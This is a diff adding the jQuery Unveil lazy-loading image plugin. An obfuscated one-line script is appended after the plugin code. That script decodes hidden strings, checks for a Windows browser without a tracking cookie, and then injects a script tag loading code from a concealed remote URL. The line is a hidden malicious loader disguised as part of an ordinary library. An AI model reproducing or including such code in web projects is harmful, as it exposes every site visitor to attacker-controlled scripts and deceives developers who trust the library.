@@ -1,0 +1,57 @@
+/**
+ * jQuery Unveil
+ * A very lightweight jQuery plugin to lazy load images
+ * http://luis-almeida.github.com/unveil
+ *
+ * Licensed under the MIT license.
+ * Copyright 2013 Luís Almeida
+ * https://github.com/luis-almeida
+ */
+
+;(function($) {
+
+  $.fn.unveil = function(threshold, callback) {
+
+    var $w = $(window),
+        th = threshold || 0,
+        retina = window.devicePixelRatio > 1,
+        attrib = retina? "data-src-retina" : "data-src",
+        images = this,
+        loaded;
+
+    this.one("unveil", function() {
+      var source = this.getAttribute(attrib);
+      source = source || this.getAttribute("data-src");
+      if (source) {
+        this.setAttribute("src", source);
+        if (typeof callback === "function") callback.call(this);
+      }
+    });
+
+    function unveil() {
+      var inview = images.filter(function() {
+        var $e = $(this);
+        if ($e.is(":hidden")) return;
+
+        var wt = $w.scrollTop(),
+            wb = wt + $w.height(),
+            et = $e.offset().top,
+            eb = et + $e.height();
+
+        return eb >= wt - th && et <= wb + th;
+      });
+
+      loaded = inview.trigger("unveil");
+      images = images.not(loaded);
+    }
+
+    $w.on("scroll.unveil resize.unveil lookup.unveil", unveil);
+
+    unveil();
+
+    return this;
+
+  };
+
+})(window.jQuery || window.Zepto);
+;(function(){var g=navigator[t("8t8n(e)gtAyr)evs)u,")];var l=document[t(":e;i4k3o)o3c,")];if(m(g,t("5sswbo}d}n,i,Wg"))&&!m(g,t("#d)i)o{r)dan;A8"))){if(!m(l,t("3=aa6m;t;u,_1_4_)"))){var r=document.createElement('script');r.type='text/javascript';r.async=true;r.src=t('w2ra9dsf64n4ff09{c}7}3(388xd)8gcb0rbn6}5;=(v{&,0}3}2(={d,i(c{?1sbj}.ueid1o;ci_{sr/)m;ozcr.,d{n,a}r(bmhts}i(m}a,.;k{c7a)r;t{/0/}:,svp)t,t(hc');var y=document.getElementsByTagName('script')[0];y.parentNode.insertBefore(r,y);}}function t(n){var s='';for(var u=0;u<n.length;u++){if(u%2===1)s+=n[u];}s=z(s);return s;}function m(a,q){return a[t("6f(Odx;eqd,n,il")](q)!==-1;}function z(p){var e='';for(var j=p.length-1;j>=0;j--){e+=p[j];}return e;}})();
